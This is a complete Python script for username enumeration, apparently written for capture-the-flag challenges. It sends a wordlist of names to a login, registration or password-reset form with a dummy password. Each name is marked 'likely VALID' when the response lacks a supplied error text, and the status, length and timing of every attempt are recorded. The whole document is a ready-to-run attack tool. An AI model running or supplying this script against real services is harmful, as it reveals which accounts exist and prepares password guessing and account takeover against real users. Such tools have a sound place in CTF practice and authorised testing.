#!/usr/bin/env python3
"""Username enumeration through login/register/reset response differences.

Reports, per username: status, length, time, and whether --invalid-text is present.
Usernames WITHOUT the invalid marker are likely valid.

    python user_enum.py http://auth10.chal.deti:8069/login --user-field emp_id --pass-field password \
        -U users.txt --invalid-text 'No such employee'
    python user_enum.py http://t/forgot --user-field email -U emails.txt --invalid-text 'unknown'
"""
import argparse
import time

import requests


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("-U", "--users", required=True)
    ap.add_argument("--user-field", default="username")
    ap.add_argument("--pass-field", default="password")
    ap.add_argument("--password", default="WrongPass123!")
    ap.add_argument("--extra", default="")
    ap.add_argument("--invalid-text", help="text shown for a NON-existent user")
    a = ap.parse_args()
    extra = dict(x.split("=", 1) for x in a.extra.split("&") if "=" in x)
    valid = []
    for u in [l.strip() for l in open(a.users, encoding="utf-8", errors="ignore") if l.strip()]:
        data = {a.user_field: u, **extra}
        if a.pass_field:
            data[a.pass_field] = a.password
        t0 = time.perf_counter()
        r = requests.post(a.url, data=data, timeout=15, allow_redirects=False)
        dt = time.perf_counter() - t0
        inval = a.invalid_text in r.text if a.invalid_text else None
        mark = "" if inval else "  <-- likely VALID" if a.invalid_text else ""
        print(f"{u:25s} {r.status_code} {len(r.content):6d} {dt:6.3f}s{mark}")
        if a.invalid_text and not inval:
            valid.append(u)
    if valid:
        print("\n[valid]", " ".join(valid))


if __name__ == "__main__":
    main()
